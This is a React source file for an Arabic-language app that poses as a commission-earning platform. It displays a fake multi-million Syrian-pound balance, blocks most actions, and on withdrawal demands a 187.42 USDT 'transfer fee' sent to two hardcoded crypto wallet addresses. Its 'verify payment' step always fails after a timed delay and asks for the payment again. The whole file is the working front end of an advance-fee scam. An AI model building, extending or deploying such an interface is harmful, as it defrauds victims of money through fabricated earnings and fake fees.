import { useState, ReactNode, ChangeEvent, useEffect } from 'react';
import { 
  Bell, 
  Share2, 
  Plus, 
  ChevronLeft, 
  LayoutGrid, 
  Wallet, 
  Link as LinkIcon,
  Home,
  ShoppingBag,
  Headset,
  User,
  Lock,
  MessageCircle,
  Info,
  Copy,
  X,
  AlertCircle
} from 'lucide-react';

type Tab = 'home' | 'grid' | 'orders' | 'support' | 'profile' | 'withdraw' | 'notifications';

export default function App() {
  const [activeTab, setActiveTab] = useState<Tab>('profile');
  const [homeBlocked, setHomeBlocked] = useState(false);
  const [isInitialLoading, setIsInitialLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  const handleHomeClick = () => {
    setHomeBlocked(true);
    setTimeout(() => {
      setHomeBlocked(false);
    }, 5000);
  };

  return (
    <div className="w-full max-w-md mx-auto min-h-screen flex flex-col bg-[#87b1e0] relative">
      {isInitialLoading && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/5">
          <div className="bg-[#333333]/90 w-32 h-32 rounded-2xl flex items-center justify-center shadow-2xl">
            <div className="relative w-10 h-10">
              {[...Array(12)].map((_, i) => (
                <div
                  key={i}
                  className="absolute left-[18.5px] top-0 w-[3px] h-[10px] bg-white rounded-full animate-spinner-fade"
                  style={{
                    transform: `rotate(${i * 30}deg)`,
                    transformOrigin: '1.5px 20px',
                    animationDelay: `${-1.1 + i * 0.1}s`
                  }}
                />
              ))}
            </div>
          </div>
        </div>
      )}
      {activeTab === 'profile' && <ProfilePage onNavigate={setActiveTab} />}
      {activeTab === 'orders' && <OrdersPage onNavigate={setActiveTab} />}
      {activeTab === 'support' && <SupportPage onNavigate={setActiveTab} />}
      {activeTab === 'grid' && <GridPage onNavigate={setActiveTab} />}
      {activeTab === 'withdraw' && <WithdrawPage onBack={() => setActiveTab('profile')} />}
      {activeTab === 'notifications' && <NotificationsPage onBack={() => setActiveTab('profile')} />}
      
      {/* Fallback for other tabs to keep the UI consistent */}
      {(activeTab !== 'profile' && activeTab !== 'orders' && activeTab !== 'support' && activeTab !== 'grid' && activeTab !== 'withdraw' && activeTab !== 'notifications') && (
        <div className="flex-1 flex items-center justify-center text-white">
          قريباً...
        </div>
      )}

      {/* Bottom Navigation */}
      {(activeTab !== 'withdraw' && activeTab !== 'notifications') && (
        <nav className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 px-4 py-2 flex justify-between items-center max-w-md mx-auto z-50">
          <NavIcon 
            icon={<Home className="w-6 h-6" />} 
            active={activeTab === 'home'} 
            onClick={handleHomeClick}
            blocked={homeBlocked}
          />
          <NavIcon icon={<LayoutGrid className="w-6 h-6" />} active={activeTab === 'grid'} onClick={() => setActiveTab('grid')} />
          <NavIcon icon={<ShoppingBag className="w-6 h-6" />} active={activeTab === 'orders'} onClick={() => setActiveTab('orders')} />
          <NavIcon icon={<Headset className="w-6 h-6" />} active={activeTab === 'support'} onClick={() => setActiveTab('support')} />
          <NavIcon icon={<User className="w-6 h-6" />} active={activeTab === 'profile'} onClick={() => setActiveTab('profile')} />
        </nav>
      )}
    </div>
  );
}

function GridPage({ onNavigate }: { onNavigate: (tab: Tab) => void }) {
  const tabs = ['الكل', 'في انتظار الدفع', 'تم الاكتمال', 'تجميد'];
  const [selectedTab, setSelectedTab] = useState('الكل');

  return (
    <div className="flex-1 flex flex-col pb-20 bg-[#87b1e0]">
      {/* Top Header */}
      <header className="p-3 flex justify-end items-center">
        <Bell className="text-[#311b92] w-6 h-6 cursor-pointer" onClick={() => onNavigate('notifications')} />
      </header>

      {/* Horizontal Tabs */}
      <div className="flex items-center justify-between px-4 py-2">
        {tabs.map((tab) => (
          <div 
            key={tab}
            className="flex flex-col items-center cursor-pointer"
            onClick={() => setSelectedTab(tab)}
          >
            <span className={`text-sm font-medium mb-1 ${selectedTab === tab ? 'text-[#311b92]' : 'text-gray-700 opacity-70'}`}>
              {tab}
            </span>
            {selectedTab === tab && (
              <div className="h-0.5 w-full bg-[#1e88e5] rounded-full" />
            )}
          </div>
        ))}
      </div>

      {/* Empty Content Area */}
      <div className="flex-1"></div>
    </div>
  );
}

function SupportPage({ onNavigate }: { onNavigate: (tab: Tab) => void }) {
  return (
    <div className="flex-1 flex flex-col pb-20 bg-gradient-to-b from-[#bbdefb] to-white">
      {/* Top Header with Gradient */}
      <div className="bg-gradient-to-b from-[#8e24aa] to-[#311b92] p-8 relative flex flex-col items-center justify-center">
        <Bell className="absolute top-4 right-4 text-[#ff5252] w-6 h-6 cursor-pointer" onClick={() => onNavigate('notifications')} />
        <h1 className="text-white text-2xl font-bold mt-8">خدمة العملاء</h1>
      </div>

      {/* Support Cards */}
      <div className="px-6 py-8 flex flex-col gap-6">
        <SupportCard time="10:00-21:00" />
        <SupportCard time="10:00-21:00" />
        
        <div className="mt-4 text-center px-4">
          <p className="text-gray-600 text-sm leading-relaxed">
            يرجى التواصل مع مديرك الخاص، سيوضح لك كيفية الشحن.
            <br />
            شكراً لك.
          </p>
        </div>
      </div>
    </div>
  );
}

function SupportCard({ time }: { time: string }) {
  return (
    <div className="bg-white rounded-2xl p-6 shadow-sm flex flex-col items-center justify-center gap-3">
      <div className="w-16 h-16 bg-[#d1c4e9] rounded-full flex items-center justify-center relative">
        <div className="w-10 h-10 bg-[#ffb74d] rounded-full flex items-center justify-center">
          <Headset className="w-6 h-6 text-white" />
        </div>
      </div>
      <span className="text-gray-800 font-medium text-lg">{time}</span>
    </div>
  );
}

function ProfilePage({ onNavigate }: { onNavigate: (tab: Tab) => void }) {
  const [blockedItem, setBlockedItem] = useState<string | null>(null);

  const handleBlockedClick = (label: string) => {
    setBlockedItem(label);
    setTimeout(() => {
      setBlockedItem(null);
    }, 5000);
  };

  return (
    <div className="flex-1 flex flex-col pb-20 bg-[#87b1e0]">
      {/* Top Header */}
      <header className="p-3 flex justify-end items-center">
        <Bell className="text-white w-5 h-5 cursor-pointer" onClick={() => onNavigate('notifications')} />
      </header>

      {/* Profile Section */}
      <div className="px-3 mb-3">
        <div className="bg-[#1e88e5] rounded-t-2xl p-4 flex items-center gap-3">
          <div className="w-14 h-14 rounded-full bg-[#f4a28c] flex items-center justify-center text-white text-2xl font-bold shadow-sm flex-shrink-0">
            G
          </div>
          <div className="flex flex-col text-white">
            <span className="text-base font-medium">Ghaith99</span>
            <div className="flex items-center gap-2 text-xs opacity-90">
              <span>رمز الدعوة 691082</span>
              <Share2 className="w-3.5 h-3.5 cursor-pointer" />
            </div>
          </div>
        </div>

        {/* Balance Card */}
        <div className="bg-white rounded-b-2xl shadow-lg overflow-hidden">
          <div className="p-5 relative flex items-center justify-between">
            <div className="flex flex-col">
              <div className="flex items-baseline gap-1">
                <span className="text-2xl font-bold text-gray-800">117,945,380.39</span>
                <span className="text-lg font-bold text-gray-800">ل.س</span>
              </div>
              <div className="flex flex-col mt-1">
                <span className="text-gray-400 text-xs">رصيدي</span>
                <span className="text-[#1e88e5] text-[10px] font-bold mt-0.5">
                  -30% الرصيد القابل للسحب 82,561,766.273 ل.س
                </span>
              </div>
            </div>
            <button className="w-10 h-10 bg-[#1e88e5] rounded-full flex items-center justify-center text-white shadow-md hover:bg-blue-600 transition-colors">
              <Plus className="w-6 h-6" />
            </button>
          </div>
          
          <div className="bg-[#fdf2ff] flex border-t border-purple-50">
            <div className="flex-1 p-3 flex flex-col items-center justify-center border-r border-dotted border-purple-200">
              <span className="text-[#00c853] font-bold text-sm">82,561,766.273 ل.س</span>
              <span className="text-[#7e57c2] text-[10px] mt-0.5">المبلغ المتاح</span>
            </div>
            <div className="flex-1 p-3 flex flex-col items-center justify-center">
              <span className="text-[#ff5252] font-bold text-sm">35,383,614.117 ل.س</span>
              <span className="text-[#7e57c2] text-[10px] mt-0.5">المبلغ المجمد</span>
            </div>
          </div>
        </div>
      </div>

      {/* Menu List */}
      <div className="px-3 mb-4">
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
          <MenuItem icon={<Wallet className="w-4 h-4 text-blue-500" />} label="سحب" onClick={() => onNavigate('withdraw')} />
          
          {[
            { label: "طلبات الشحن", icon: <LayoutGrid className="w-4 h-4 text-blue-500" />, last: false },
            { label: "طلبات السحب", icon: <LayoutGrid className="w-4 h-4 text-blue-500" />, last: false },
            { label: "تفاصيل المستخدم", icon: <LayoutGrid className="w-4 h-4 text-blue-500" />, last: false },
            { label: "معلومات", icon: <Bell className="w-4 h-4 text-blue-500" />, last: false },
            { label: "معلومات الربط", icon: <LinkIcon className="w-4 h-4 text-blue-500" />, last: false },
            { label: "تغيير كلمة المرور", icon: <Lock className="w-4 h-4 text-blue-500" />, last: false },
            { label: "اختر اللغة", icon: <MessageCircle className="w-4 h-4 text-blue-500" />, last: false },
            { label: "تسجيل الخروج", icon: <Info className="w-4 h-4 text-red-400" />, last: true }
          ].map(({ label, icon, last }) => (
            <MenuItem 
              key={label}
              icon={icon} 
              label={label} 
              last={last}
              blocked={blockedItem === label}
              onClick={() => handleBlockedClick(label)}
            />
          ))}
        </div>
      </div>
    </div>
  );
}

function OrdersPage({ onNavigate }: { onNavigate: (tab: Tab) => void }) {
  const [blockedItem, setBlockedItem] = useState<string | null>(null);

  const handleBlockedClick = (label: string) => {
    setBlockedItem(label);
    setTimeout(() => {
      setBlockedItem(null);
    }, 5000);
  };

  return (
    <div className="flex-1 flex flex-col pb-20 bg-gradient-to-b from-[#5c9ce6] to-[#87b1e0]">
      {/* Top Header */}
      <header className="p-3 flex justify-end items-center">
        <Bell className="text-white w-5 h-5 cursor-pointer" onClick={() => onNavigate('notifications')} />
      </header>

      {/* Balance Header */}
      <div className="px-5 py-4 flex items-center justify-between">
        <div className="flex flex-col text-white">
          <div className="flex items-baseline gap-1">
            <span className="text-2xl font-bold">117,945,380.39</span>
            <span className="text-xl font-bold">ل.س</span>
          </div>
          <span className="text-[10px] font-bold mt-1">
            -30% الرصيد القابل للسحب 82,561,766.273 ل.س
          </span>
          <span className="text-xs opacity-80 mt-1">أموال الحساب</span>
        </div>
        <button className="w-10 h-10 bg-[#1e88e5] rounded-full flex items-center justify-center text-white shadow-md">
          <Plus className="w-6 h-6" />
        </button>
      </div>

      {/* Stats Card */}
      <div className="px-3 mb-4">
        <div className="bg-[#1e88e5] rounded-2xl p-5 text-white shadow-lg">
          <div className="text-sm mb-8 opacity-90">العمولة 30.00% | 10 الطلبات</div>
          <div className="flex justify-between items-center text-center">
            <div className="flex-1">
              <div className="text-3xl font-bold mb-1">0</div>
              <div className="text-xs opacity-80">غير مكتمل</div>
            </div>
            <div className="flex-1">
              <div className="text-3xl font-bold mb-1">10</div>
              <div className="text-xs opacity-80">الكل</div>
            </div>
            <div className="flex-1">
              <div className="text-3xl font-bold mb-1">10</div>
              <div className="text-xs opacity-80">تم الاكتمال</div>
            </div>
          </div>
        </div>
      </div>

      {/* Details Card */}
      <div className="px-3 mb-6">
        <div className="bg-white rounded-2xl p-4 shadow-sm">
          <div className="grid grid-cols-2 gap-y-6">
            <div className="flex-col text-right flex">
              <span className="text-sm font-bold text-gray-800">35,383,614.117 ل.س</span>
              <span className="text-xs text-gray-400">المبلغ المجمد</span>
            </div>
            <div className="flex flex-col text-right">
              <span className="text-lg font-bold text-gray-800">60349380.39 ل.س</span>
              <span className="text-xs text-gray-400">العمولة المكتسبة</span>
            </div>
            <div className="flex flex-col text-right">
              <span className="text-sm font-bold text-gray-800">82,561,766.273 ل.س</span>
              <span className="text-xs text-gray-400">المبلغ المتاح</span>
            </div>
            <div className="flex flex-col text-right">
              <span className="text-lg font-bold text-gray-800">10</span>
              <span className="text-xs text-gray-400">عدد الطلبات المكتملة</span>
            </div>
          </div>

          <div className="relative">
            <button 
              className="mt-8 w-full bg-[#1e88e5] text-white py-3.5 rounded-xl font-bold text-lg shadow-md hover:bg-blue-600 transition-colors relative"
              onClick={() => handleBlockedClick('start_orders')}
            >
              ابدأ في استلام الطلبات
              {blockedItem === 'start_orders' && (
                <div className="absolute -top-1 -right-1 text-xl bg-white rounded-full leading-none">
                  🚫
                </div>
              )}
            </button>
            
            {blockedItem === 'start_orders' && (
              <div className="absolute -top-12 left-1/2 -translate-x-1/2 bg-black/80 text-white text-[10px] py-1.5 px-3 rounded shadow-lg z-50 animate-in fade-in slide-in-from-bottom-2 duration-300 pointer-events-none w-[200px] text-center" dir="rtl">
                اصبح الحساب مخصص فقط للسحب وسيتم تجميده بعد عملية سحب العملات
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function MenuItem({ 
  icon, 
  label, 
  last = false, 
  onClick,
  blocked = false
}: { 
  icon: ReactNode, 
  label: string, 
  last?: boolean, 
  onClick?: () => void,
  blocked?: boolean,
  key?: any
}) {
  return (
    <div 
      className={`flex items-center justify-between p-3.5 hover:bg-gray-50 cursor-pointer transition-colors relative ${!last ? 'border-b border-gray-50' : ''}`}
      onClick={onClick}
    >
      <div className="flex items-center gap-3">
        <div className="w-9 h-9 bg-[#bbdefb] rounded-lg flex items-center justify-center flex-shrink-0 relative">
          {icon}
          {blocked && (
            <div className="absolute -top-1 -right-1 text-xs bg-white rounded-full leading-none">
              🚫
            </div>
          )}
        </div>
        <span className="text-gray-700 text-sm font-medium">{label}</span>
      </div>
      
      {blocked && (
        <div className="absolute right-12 top-1/2 -translate-y-1/2 bg-black/80 text-white text-[10px] py-1 px-2 rounded shadow-lg z-10 animate-in fade-in slide-in-from-right-2 duration-300 pointer-events-none max-w-[180px] text-right" dir="rtl">
          اصبح الحساب مخصص فقط للسحب وسيتم تجميده بعد عملية سحب العملات
        </div>
      )}

      <ChevronLeft className="w-4 h-4 text-gray-300 rotate-180" />
    </div>
  );
}

function NotificationsPage({ onBack }: { onBack: () => void }) {
  return (
    <div className="flex-1 flex flex-col bg-gradient-to-b from-[#87b1e0] to-[#e3f2fd] min-h-screen">
      {/* Header */}
      <header className="bg-[#1e88e5] p-4 flex items-center justify-between text-white shadow-md">
        <div className="flex items-center gap-4 flex-1">
          <ChevronLeft className="w-6 h-6 cursor-pointer" onClick={onBack} />
        </div>
        <h1 className="text-lg font-bold flex-1 text-center">رسالة النظام</h1>
        <div className="flex-1"></div>
      </header>

      {/* Content Area - Just the gradient as per the screenshot */}
      <div className="flex-1"></div>
    </div>
  );
}

function NavIcon({ 
  icon, 
  active, 
  onClick,
  blocked = false
}: { 
  icon: ReactNode, 
  active: boolean, 
  onClick: () => void,
  blocked?: boolean
}) {
  return (
    <div 
      className={`cursor-pointer transition-colors p-2 relative ${active ? 'text-[#1e88e5]' : 'text-gray-400'}`}
      onClick={onClick}
    >
      <div className="relative">
        {icon}
        {blocked && (
          <div className="absolute -top-1 -right-1 text-[10px] bg-white rounded-full leading-none">
            🚫
          </div>
        )}
      </div>

      {blocked && (
        <div className="absolute bottom-12 left-1/2 -translate-x-1/2 bg-black/80 text-white text-[10px] py-1.5 px-3 rounded shadow-lg z-50 animate-in fade-in slide-in-from-bottom-2 duration-300 pointer-events-none w-[200px] text-center" dir="rtl">
          اصبح الحساب مخصص فقط للسحب وسيتم تجميده بعد عملية سحب العملات
        </div>
      )}
    </div>
  );
}

function WithdrawPage({ onBack }: { onBack: () => void }) {
  const [amount, setAmount] = useState('');
  const [fundPassword, setFundPassword] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [error, setError] = useState('');
  const [fundPasswordError, setFundPasswordError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationFailed, setVerificationFailed] = useState(false);
  const balance = 82561766.273;

  const handleAmountChange = (e: ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Only allow numbers and decimal point
    if (value !== '' && !/^\d*\.?\d*$/.test(value)) return;
    
    setAmount(value);
    const numValue = parseFloat(value);
    if (numValue > balance) {
      setError('المبلغ المدخل يتجاوز الرصيد القابل للسحب');
    } else {
      setError('');
    }
  };

  const handleWithdrawClick = () => {
    if (fundPassword !== '691082') {
      setFundPasswordError('كلمة مرور الأموال غير صحيحة');
      return;
    }
    setFundPasswordError('');
    setShowModal(true);
  };

  const handleVerifyPayment = () => {
    setIsVerifying(true);
    setVerificationFailed(false);
    
    setTimeout(() => {
      setIsVerifying(false);
      setVerificationFailed(true);
    }, 10000);
  };

  const closeModal = () => {
    setShowModal(false);
    setIsVerifying(false);
    setVerificationFailed(false);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    // Optional: show a small toast or alert
  };

  const isButtonDisabled = !amount || parseFloat(amount) <= 0 || parseFloat(amount) > balance;

  return (
    <div className="flex-1 flex flex-col bg-[#87b1e0] pb-10 relative">
      {/* Header */}
      <header className="bg-[#1e88e5] p-4 flex items-center justify-between text-white">
        <ChevronLeft className="w-6 h-6 cursor-pointer" onClick={onBack} />
        <h1 className="text-lg font-bold">سحب</h1>
        <div className="w-6 h-6 bg-white/20 rounded-full flex items-center justify-center">
          <User className="w-4 h-4" />
        </div>
      </header>

      {/* Amount Card */}
      <div className="px-4 mt-4">
        <div className="bg-gradient-to-b from-[#1e88e5] to-[#42a5f5] rounded-2xl p-10 flex flex-col items-center justify-center text-white shadow-lg">
          <div className="flex items-baseline gap-2 mb-2">
            <span className="text-3xl font-bold">82,561,766.273</span>
            <span className="text-xl font-bold">ل.س</span>
          </div>
          <span className="text-sm opacity-80">المبلغ القابل للسحب</span>
        </div>
      </div>

      {/* Form */}
      <div className="px-4 mt-8 flex flex-col gap-6">
        <div className="flex flex-col gap-2">
          <label className="text-gray-800 font-bold text-sm">مبلغ السحب</label>
          <div className="relative">
            <input 
              type="text" 
              value={amount}
              onChange={handleAmountChange}
              placeholder="يرجى إدخال المبلغ" 
              className={`w-full bg-white rounded-xl p-4 text-sm outline-none shadow-sm placeholder:text-gray-300 ${error ? 'border-2 border-red-500' : ''}`}
            />
            {error && (
              <div className="absolute -bottom-6 right-0 flex items-center gap-1 text-red-600 text-[10px] font-bold">
                <AlertCircle className="w-3 h-3" />
                <span>{error}</span>
              </div>
            )}
          </div>
        </div>

        <div className="flex flex-col gap-2 relative mt-2">
          <input 
            type="password" 
            value={fundPassword}
            onChange={(e) => {
              setFundPassword(e.target.value);
              if (fundPasswordError) setFundPasswordError('');
            }}
            placeholder="يرجى إدخال كلمة مرور الأموال" 
            className={`bg-white rounded-xl p-4 text-sm outline-none shadow-sm placeholder:text-gray-300 ${fundPasswordError ? 'border-2 border-red-500' : ''}`}
          />
          <div className="absolute left-4 top-4 text-gray-300">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
          </div>
          {fundPasswordError && (
            <div className="absolute -bottom-6 right-0 flex items-center gap-1 text-red-600 text-[10px] font-bold">
              <AlertCircle className="w-3 h-3" />
              <span>{fundPasswordError}</span>
            </div>
          )}
        </div>

        <p className="text-gray-500 text-[11px] leading-relaxed">
          * سيقوم النظام بالمراجعة تلقائياً. وقت المراجعة من 5 إلى 30 دقيقة. لا يمكن التدخل يدوياً. يرجى الانتظار بصبر.
        </p>
      </div>

      {/* Action Button */}
      <div className="mt-auto px-4 pb-4">
        <button 
          disabled={isButtonDisabled}
          onClick={handleWithdrawClick}
          className={`w-full py-4 rounded-xl font-bold text-lg shadow-md transition-all ${
            isButtonDisabled 
            ? 'bg-gray-400 cursor-not-allowed opacity-70' 
            : 'bg-gradient-to-r from-[#1e88e5] to-[#42a5f5] text-white active:scale-[0.98]'
          }`}
        >
          اسحب الآن
        </button>
      </div>

      {/* Payment Modal */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
          <div className="bg-white rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl animate-in fade-in zoom-in duration-300">
            <div className="bg-[#1e88e5] p-6 text-white flex justify-between items-center">
              <h2 className="text-xl font-bold">تنبيه أمني وهام</h2>
              <X className="w-6 h-6 cursor-pointer" onClick={closeModal} />
            </div>
            
            <div className="p-6 flex flex-col gap-4 text-right" dir="rtl">
              {isVerifying ? (
                <div className="py-10 flex flex-col items-center justify-center gap-4">
                  <div className="w-12 h-12 border-4 border-[#1e88e5] border-t-transparent rounded-full animate-spin"></div>
                  <p className="text-[#1e88e5] font-bold">جاري التأكد من دفع الأجور...</p>
                </div>
              ) : verificationFailed ? (
                <div className="flex flex-col gap-4">
                  <div className="bg-red-50 border-r-4 border-red-500 p-4 rounded-lg flex items-center gap-3">
                    <AlertCircle className="w-6 h-6 text-red-500 shrink-0" />
                    <p className="text-red-700 text-sm font-bold">
                      فشل التحقق من الدفع، يرجى إرسال 187.42 USDT إلى أحد العنوانين المرفقة
                    </p>
                  </div>
                  
                  <div className="flex flex-col gap-3">
                    <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                      <span className="text-[10px] text-gray-400 block mb-1">عنوان TRC20</span>
                      <div className="flex items-center justify-between gap-2">
                        <Copy 
                          className="w-4 h-4 text-[#1e88e5] cursor-pointer active:scale-90 transition-transform" 
                          onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')}
                        />
                        <span className="text-[11px] font-mono text-gray-700 break-all text-left flex-1">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
                      </div>
                    </div>

                    <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                      <span className="text-[10px] text-gray-400 block mb-1">عنوان BEP20 (BSC)</span>
                      <div className="flex items-center justify-between gap-2">
                        <Copy 
                          className="w-4 h-4 text-[#1e88e5] cursor-pointer active:scale-90 transition-transform" 
                          onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')}
                        />
                        <span className="text-[11px] font-mono text-gray-700 break-all text-left flex-1">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                      </div>
                    </div>
                  </div>

                  <button 
                    onClick={handleVerifyPayment}
                    className="w-full bg-[#1e88e5] text-white py-3 rounded-xl font-bold mt-2 shadow-lg active:scale-95 transition-transform"
                  >
                    أعد التحقق الآن
                  </button>
                </div>
              ) : (
                <>
                  <p className="text-gray-700 text-sm leading-relaxed font-medium">
                    عزيزي المستخدم، نظراً لأن عملية السحب الحالية تتطلب إجراءات تقنية متقدمة خارج البروتوكول القياسي للمنصة لضمان وصول أموالك بأمان وسرعة، سيتم معالجة طلبك عبر نظام حوسبة سحابية خارجية مستقلة.
                  </p>
                  
                  <div className="bg-blue-50 border-r-4 border-[#1e88e5] p-4 rounded-lg">
                    <p className="text-[#1e88e5] text-sm font-bold mb-1">رسوم التحويل المنفصلة:</p>
                    <p className="text-gray-800 text-lg font-black">187.42 USDT</p>
                  </div>

                  <p className="text-gray-600 text-xs leading-relaxed italic">
                    * يجب دفع رسوم التحويل بشكل منفصل لتغطية تكاليف الحوسبة الخارجية وتأمين الشبكة. بمجرد تأكيد الدفع، سيتم إرسال العملات إلى محفظتك فوراً.
                  </p>

                  <div className="flex flex-col gap-3 mt-2">
                    <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                      <span className="text-[10px] text-gray-400 block mb-1">عنوان TRC20</span>
                      <div className="flex items-center justify-between gap-2">
                        <Copy 
                          className="w-4 h-4 text-[#1e88e5] cursor-pointer active:scale-90 transition-transform" 
                          onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')}
                        />
                        <span className="text-[11px] font-mono text-gray-700 break-all text-left flex-1">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
                      </div>
                    </div>

                    <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                      <span className="text-[10px] text-gray-400 block mb-1">عنوان BEP20 (BSC)</span>
                      <div className="flex items-center justify-between gap-2">
                        <Copy 
                          className="w-4 h-4 text-[#1e88e5] cursor-pointer active:scale-90 transition-transform" 
                          onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')}
                        />
                        <span className="text-[11px] font-mono text-gray-700 break-all text-left flex-1">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-3 mt-4">
                    <button 
                      onClick={closeModal}
                      className="flex-1 bg-gray-100 text-gray-600 py-3 rounded-xl font-bold shadow-sm active:scale-95 transition-transform"
                    >
                      ليس الآن
                    </button>
                    <button 
                      onClick={handleVerifyPayment}
                      className="flex-[2] bg-[#1e88e5] text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
                    >
                      قمت بالدفع، تابع
                    </button>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
